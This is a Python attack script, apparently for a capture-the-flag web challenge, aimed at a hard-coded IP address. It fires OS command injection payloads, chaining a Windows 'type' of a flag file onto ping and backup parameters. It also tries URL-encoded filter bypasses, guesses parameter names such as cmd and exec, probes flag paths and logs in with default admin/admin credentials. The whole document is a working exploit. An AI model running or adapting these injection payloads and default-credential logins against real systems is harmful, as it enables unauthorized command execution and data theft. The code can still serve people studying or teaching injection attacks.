import requests
import re
import os

os.environ.pop('HTTP_PROXY', None)
os.environ.pop('HTTPS_PROXY', None)
requests.packages.urllib3.disable_warnings()

TARGET = "http://119.29.238.216:8088"
session = requests.Session()
session.verify = False
session.proxies = {}
session.headers.update({"User-Agent": "Mozilla/5.0"})

print("="*70)
print("测试Ping POST请求")
print("="*70)

# 使用POST方法测试
ping_payloads = [
    "127.0.0.1 & type F:\\flag.txt",
    "127.0.0.1 && type F:\\flag.txt",
    "127.0.0.1 | type F:\\flag.txt",
    "127.0.0.1; type F:\\flag.txt",
    "127.0.0.1 & type F:\\small peoject\\python-lab\\flag.txt",
]

for payload in ping_payloads:
    try:
        r = session.post(f"{TARGET}/ping", data={"host": payload}, timeout=15)
        if r.status_code == 200:
            body = re.search(r'<pre>(.*?)</pre>', r.text, re.DOTALL)
            if body:
                content = body.group(1).strip()
                if len(content) > 50 and "Blocked" not in content:
                    print(f"\n>>> POST {payload}")
                    print(f"响应: {content[:500]}")
                    
                    flag_match = re.search(r'flag\{[^}]+\}', content, re.IGNORECASE)
                    if flag_match:
                        print(f"\n🚩🚩🚩 FLAG FOUND: {flag_match.group(0)} 🚩🚩🚩")
                        exit(0)
    except:
        pass

print("\n" + "="*70)
print("测试Backup POST请求")
print("="*70)

backup_payloads = [
    "F:\\small peoject\\python-lab\\uploads & type F:\\flag.txt",
    "F:\\small peoject\\python-lab\\uploads && type F:\\flag.txt",
    "F:\\small peoject\\python-lab\\uploads | type F:\\flag.txt",
    "F:\\small peoject\\python-lab\\uploads; type F:\\flag.txt",
]

for payload in backup_payloads:
    try:
        r = session.post(f"{TARGET}/backup", data={"path": payload}, timeout=15)
        if r.status_code == 200:
            body = re.search(r'<pre>(.*?)</pre>', r.text, re.DOTALL)
            if body:
                content = body.group(1).strip()
                if len(content) > 20 and "Blocked" not in content:
                    print(f"\n>>> POST {payload}")
                    print(f"响应: {content[:500]}")
                    
                    flag_match = re.search(r'flag\{[^}]+\}', content, re.IGNORECASE)
                    if flag_match:
                        print(f"\n🚩🚩🚩 FLAG FOUND: {flag_match.group(0)} 🚩🚩🚩")
                        exit(0)
    except:
        pass

print("\n" + "="*70)
print("测试特殊编码绕过")
print("="*70)

# URL编码绕过
encoded_payloads = [
    ("127.0.0.1%20%26%20type%20F%5Cflag.txt", "URL编码空格和&"),
    ("127.0.0.1%26type%20F%5Cflag.txt", "URL编码&"),
    ("127.0.0.1%3Btype%20F%5Cflag.txt", "URL编码;"),
    ("127.0.0.1%7Ctype%20F%5Cflag.txt", "URL编码|"),
]

for payload, desc in encoded_payloads:
    try:
        # 直接使用URL（不经过params编码）
        r = session.get(f"{TARGET}/ping?host={payload}", timeout=15)
        if r.status_code == 200:
            body = re.search(r'<pre>(.*?)</pre>', r.text, re.DOTALL)
            if body:
                content = body.group(1).strip()
                if len(content) > 50 and "Blocked" not in content:
                    print(f"\n>>> {desc}: {payload}")
                    print(f"响应: {content[:500]}")
                    
                    flag_match = re.search(r'flag\{[^}]+\}', content, re.IGNORECASE)
                    if flag_match:
                        print(f"\n🚩🚩🚩 FLAG FOUND: {flag_match.group(0)} 🚩🚩🚩")
                        exit(0)
    except:
        pass

print("\n" + "="*70)
print("测试不同的Ping参数")
print("="*70)

# 测试不同的参数名
param_names = ["host", "ip", "target", "address", "server", "url", "cmd", "command", "exec"]

for param in param_names:
    for cmd in ["type F:\\flag.txt", "type F:\\small peoject\\python-lab\\flag.txt"]:
        payload = f"127.0.0.1 & {cmd}"
        try:
            r = session.get(f"{TARGET}/ping", params={param: payload}, timeout=15)
            if r.status_code == 200:
                body = re.search(r'<pre>(.*?)</pre>', r.text, re.DOTALL)
                if body:
                    content = body.group(1).strip()
                    if len(content) > 50 and "Blocked" not in content:
                        print(f"\n>>> ?{param}={payload}")
                        print(f"响应: {content[:500]}")
                        
                        flag_match = re.search(r'flag\{[^}]+\}', content, re.IGNORECASE)
                        if flag_match:
                            print(f"\n🚩🚩🚩 FLAG FOUND: {flag_match.group(0)} 🚩🚩🚩")
                            exit(0)
        except:
            pass

print("\n" + "="*70)
print("测试直接访问flag路径")
print("="*70)

# 测试直接访问flag
flag_paths = [
    "/flag",
    "/flag.txt",
    "/FLAG",
    "/FLAG.txt",
    "/f1ag",
    "/fl4g",
    "/.flag",
    "/secret_flag",
]

for path in flag_paths:
    try:
        r = session.get(f"{TARGET}{path}", timeout=10)
        if r.status_code == 200 and len(r.text) > 10:
            print(f"\n>>> {path}")
            print(f"内容: {r.text[:200]}")
            
            flag_match = re.search(r'flag\{[^}]+\}', r.text, re.IGNORECASE)
            if flag_match:
                print(f"\n🚩🚩🚩 FLAG FOUND: {flag_match.group(0)} 🚩🚩🚩")
                exit(0)
    except:
        pass

print("\n" + "="*70)
print("测试控制台页面")
print("="*70)

# 尝试使用登录成功的session访问控制台
try:
    r = session.get(f"{TARGET}/login", timeout=10)
    csrf = re.search(r'name=["\']csrf["\']\s*value=["\']([^"\']+)["\']', r.text)
    csrf_token = csrf.group(1) if csrf else ""
    
    # 使用正确的凭据登录
    data = {"username": "admin", "password": "admin", "csrf": csrf_token}
    r = session.post(f"{TARGET}/login", data=data, timeout=10)
    
    # 检查是否有session cookie
    print(f"Cookies: {session.cookies.get_dict()}")
    
    # 访问控制台
    r = session.get(f"{TARGET}/dashboard", timeout=10)
    print(f"\n控制台响应:")
    print(f"状态码: {r.status_code}")
    print(f"内容: {r.text[:800]}")
    
    flag_match = re.search(r'flag\{[^}]+\}', r.text, re.IGNORECASE)
    if flag_match:
        print(f"\n🚩🚩🚩 FLAG FOUND: {flag_match.group(0)} 🚩🚩🚩")
        exit(0)
except:
    pass

print("\n测试完成")